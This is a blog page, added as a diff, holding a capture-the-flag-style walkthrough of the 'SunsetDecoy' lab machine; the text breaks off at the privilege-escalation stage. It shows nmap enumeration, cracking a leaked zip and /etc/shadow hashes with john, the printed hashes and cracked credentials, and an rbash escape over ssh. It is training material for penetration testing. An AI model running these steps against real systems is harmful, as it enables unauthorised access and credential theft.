@@ -1,0 +1,1250 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="cn">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Cracking Zip File,Cracking Shadow File,Chkrootkit exploit," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="This machine is exploited by leaking and brute-forcing a backup of &#x2F;etc&#x2F;shadow. It is escalated by a local privilege escalation vulnerability in Chkrootkit version 0.49 that is run by the root user.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SunsetDecoy">
+<meta property="og:url" content="https://sev1on.github.io/undefined/SunsetDecoy/index.html">
+<meta property="og:site_name" content="Sev1on">
+<meta property="og:description" content="This machine is exploited by leaking and brute-forcing a backup of &#x2F;etc&#x2F;shadow. It is escalated by a local privilege escalation vulnerability in Chkrootkit version 0.49 that is run by the root user.">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-08-03T09:32:11.000Z">
+<meta property="article:modified_time" content="2021-08-03T13:55:00.502Z">
+<meta property="article:author" content=" ">
+<meta property="article:tag" content="Cracking Zip File">
+<meta property="article:tag" content="Cracking Shadow File">
+<meta property="article:tag" content="Chkrootkit exploit">
+<meta name="twitter:card" content="summary">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Sev1on'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://sev1on.github.io/undefined/SunsetDecoy/"/>
+
+
+
+
+
+  <title>SunsetDecoy | Sev1on</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="cn">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Sev1on</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fas fa-tag"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-fa-solid fa-align-center"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-far fa-user-circle"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://sev1on.github.io/undefined/SunsetDecoy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/Sevion3.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sev1on">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SunsetDecoy</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-08-03T09:32:11+00:00">
+                2021-08-03
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux-Walkthrough/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux Walkthrough</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  This machine is exploited by leaking and brute-forcing a backup of /etc/shadow. It is escalated by a local privilege escalation vulnerability in Chkrootkit version 0.49 that is run by the root user.
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="Exploitation-Guide-for-SunsetDecoy"><a href="#Exploitation-Guide-for-SunsetDecoy" class="headerlink" title="Exploitation Guide for SunsetDecoy"></a><strong>Exploitation Guide for SunsetDecoy</strong></h1><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a><strong>Summary</strong></h2><h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a><strong>Enumeration</strong></h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h3><p>We start off by running an <code>nmap</code> scan:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap 192.168.120.164</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 10:52 EDT</span><br><span class="line">Nmap scan report for 192.168.120.164</span><br><span class="line">Host is up (0.038s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will further enumerate the discovered SSH and HTTP services:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo nmap -sV -sC -p 22,80 192.168.120.164</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-26 11:02 EDT</span><br><span class="line">Nmap scan report for 192.168.120.164</span><br><span class="line">Host is up (0.029s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)</span><br><span class="line">|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)</span><br><span class="line">|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 3.0K  2020-07-07 16:36  save.zip</span><br><span class="line">|_</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a><strong>Web Enumeration</strong></h3><p>In the more detailed scan, we see a zip file <strong>save.zip</strong> in the web root:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">| http-ls: Volume /</span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| 3.0K  2020-07-07 16:36  save.zip</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can download this file for further inspection:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ wget http://192.168.120.164/save.zip</span><br><span class="line">--2020-08-26 13:03:56--  http://192.168.120.164/save.zip</span><br><span class="line">Connecting to 192.168.120.164:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 3123 (3.0K) [application/zip]</span><br><span class="line">Saving to: ‘save.zip’</span><br><span class="line"></span><br><span class="line">save.zip                    100%[=========================================&gt;]   3.05K  --.-KB/s    in 0s</span><br><span class="line"></span><br><span class="line">2020-08-26 13:03:56 (314 MB/s) - ‘save.zip’ saved [3123/3123]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>However, when trying to unzip the file, we see that it is password protected:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ unzip save.zip</span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] etc/passwd password:</span><br><span class="line">^C</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Cracking-Zip-File"><a href="#Cracking-Zip-File" class="headerlink" title="Cracking Zip File"></a><strong>Cracking Zip File</strong></h3><p>We will try to brute-force the needed password with <code>john</code>. First, we will use <code>zip2john</code> to convert the file to a format supported by the password cracker:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ zip2john save.zip &gt; pass.hash</span><br><span class="line">Created directory: /home/kali/.john</span><br><span class="line">ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: 2b chk, TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE</span><br><span class="line">ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: 2b chk, TS_chk, cmplen=434, decmplen=1111, crc=E11EC139</span><br><span class="line">ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: 2b chk, TS_chk, cmplen=460, decmplen=829, crc=A1F81C08</span><br><span class="line">ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: 2b chk, TS_chk, cmplen=368, decmplen=669, crc=FF05389F</span><br><span class="line">ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: 2b chk, TS_chk, cmplen=140, decmplen=185, crc=DFB905CD</span><br><span class="line">ver 1.0 efh 5455 efh 7875 save.zip/etc/hostname PKZIP Encr: 2b chk, TS_chk, cmplen=45, decmplen=33, crc=D9C379A9</span><br><span class="line">NOTE: It is assumed that all files in each archive have the same password.</span><br><span class="line">If that is not the case, the hash may be uncrackable. To avoid this, use</span><br><span class="line">option -o to pick a file at a time.</span><br><span class="line">kali@kali:~$</span><br><span class="line">kali@kali:~$ ls</span><br><span class="line">pass.hash  save.zip</span><br><span class="line">kali@kali:~$ cat pass.hash</span><br><span class="line">save.zip:$pkzip2$3*2*1*0*8*24*a1f8*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*b3ac*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*d9c3*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip2$::save.zip:etc/hostname, etc/group, etc/passwd:save.zip</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now we can attack the hash file with <code>john</code> using the <strong>rockyou.txt</strong> wordlist:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt pass.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (PKZIP [32/64])</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">manuel           (save.zip)</span><br><span class="line">1g 0:00:00:00 DONE (2020-08-26 13:07) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The tool very quickly finds that the needed password to unlock the zip file is <code>manuel</code>. Now we can extract the contents of the file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ unzip save.zip</span><br><span class="line">Archive:  save.zip</span><br><span class="line">[save.zip] etc/passwd password:</span><br><span class="line">  inflating: etc/passwd</span><br><span class="line">  inflating: etc/shadow</span><br><span class="line">  inflating: etc/group</span><br><span class="line">  inflating: etc/sudoers</span><br><span class="line">  inflating: etc/hosts</span><br><span class="line"> extracting: etc/hostname</span><br><span class="line">kali@kali:~$</span><br><span class="line">kali@kali:~$ ls</span><br><span class="line">etc  pass.hash  save.zip</span><br><span class="line">kali@kali:~$ ls -l etc/</span><br><span class="line">total 24</span><br><span class="line">-rw-r--r-- 1 kali kali  829 Jun 27 17:40 group</span><br><span class="line">-rw-r--r-- 1 kali kali   33 Jun 27 17:39 hostname</span><br><span class="line">-rw-r--r-- 1 kali kali  185 Jun 27 16:58 hosts</span><br><span class="line">-rw-r--r-- 1 kali kali 1807 Jun 27 18:05 passwd</span><br><span class="line">-rw-r----- 1 kali kali 1111 Jul  7 16:26 shadow</span><br><span class="line">-r--r----- 1 kali kali  669 Feb  2  2020 sudoers</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We find what looks to be a backup of some of the files in the target’s <em>/etc</em> directory. Most importantly, we have the <strong>/etc/shadow</strong> file with user password hashes.</p>
+<h3 id="Cracking-Shadow-File"><a href="#Cracking-Shadow-File" class="headerlink" title="Cracking Shadow File"></a><strong>Cracking Shadow File</strong></h3><p>Inside the <strong>shadow</strong> file, we find two users of interest (<code>root</code> and user <code>296640a3b825115a47b68fc44501c828</code>):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat etc/shadow | grep 18450</span><br><span class="line">root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::</span><br><span class="line">296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will copy these hashes into another file and try to crack them:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat etc/shadow | grep 18450 &gt; users.hash</span><br><span class="line">kali@kali:~/Documents/PG-PLAY/sunsetdecoy$ cat users.hash</span><br><span class="line">root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::</span><br><span class="line">296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us.:18450:0:99999:7:::</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can use <code>john</code> and the <strong>rockyou.txt</strong> wordlist once again:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ john --wordlist=/usr/share/wordlists/rockyou.txt users.hash</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">server           (296640a3b825115a47b68fc44501c828)</span><br><span class="line">1g 0:00:00:45 0.99% (ETA: 14:31:16) 0.02185g/s 3670p/s 4045c/s 4045C/s playoffs..paris17</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session aborted</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>john</code> cracks the user’s password quite quickly, but we are not able to crack the <code>root</code> user password. Nevertheless, we have obtained credentials <code>296640a3b825115a47b68fc44501c828:server</code>.</p>
+<h3 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a><strong>SSH</strong></h3><p>With the recovered user credentials, we are able to SSH into the target. Before we do, however, we will take a look at the recovered <strong>/etc/passwd</strong> file to find out more about this user:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ cat etc/passwd | grep &quot;296640a3b825115a47b68fc44501c828&quot;</span><br><span class="line">296640a3b825115a47b68fc44501c828:x:1000:1000:,,,:/home/296640a3b825115a47b68fc44501c828:/bin/rbash</span><br><span class="line">kali@kali:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We see that the default shell of the user is <code>/bin/rbash</code>, which is a restricted shell. In order to escape this restricted environment, we will append <code>-t &quot;bash --noprofile&quot;</code> to the <code>ssh</code> command:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ ssh 296640a3b825115a47b68fc44501c828@192.168.120.164 -t &quot;bash --noprofile&quot;</span><br><span class="line">...</span><br><span class="line">296640a3b825115a47b68fc44501c828@192.168.120.164&#x27;s password:</span><br><span class="line">bash: dircolors: command not found</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ id</span><br><span class="line">uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) groups=1000(296640a3b825115a47b68fc44501c828)</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><h3 id="Local-Enumeration"><a href="#Local-Enumeration" class="headerlink" title="Local Enumeration"></a><strong>Local Enumeration</strong></h3><p>Something we will quickly discover is that our <code>PATH</code> is not very useful right now:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami</span><br><span class="line">bash: whoami: command not found</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ echo $PATH</span><br><span class="line">PATH:/home/296640a3b825115a47b68fc44501c828/</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/whoami</span><br><span class="line">296640a3b825115a47b68fc44501c828</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We can either fix it or simply use full binary paths when executing programs. In the home directory of the user, we find the following:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ls</span><br><span class="line">honeypot.decoy  honeypot.decoy.cpp  id  ifconfig  ls  mkdir</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We will try to run the <strong>honeypot.decoy</strong> binary:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ./honeypot.decoy</span><br><span class="line">--------------------------------------------------</span><br><span class="line"></span><br><span class="line">Welcome to the Honey Pot administration manager (HPAM). Please select an option.</span><br><span class="line">1 Date.</span><br><span class="line">2 Calendar.</span><br><span class="line">3 Shutdown.</span><br><span class="line">4 Reboot.</span><br><span class="line">5 Launch an AV Scan.</span><br><span class="line">6 Check /etc/passwd.</span><br><span class="line">7 Leave a note.</span><br><span class="line">8 Check all services status.</span><br><span class="line"></span><br><span class="line">Option selected:</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We are met with this selection, of which we will choose option <code>5 Launch an AV Scan</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Option selected:5</span><br><span class="line"></span><br><span class="line">The AV Scan will be launched in a minute or less.</span><br><span class="line">--------------------------------------------------</span><br><span class="line">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The system informs us that the scan will be launched within 60 seconds. This hints that there is a process that is running that we might want a closer look into.</p>
+<h3 id="PSpy-Process-Monitor"><a href="#PSpy-Process-Monitor" class="headerlink" title="PSpy Process Monitor"></a><strong>PSpy Process Monitor</strong></h3><p>We will try running the <code>PSpy</code> process monitoring tool to check what might be running on the system. Download the tool from <a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a> and host it on the attacking web server:</p>
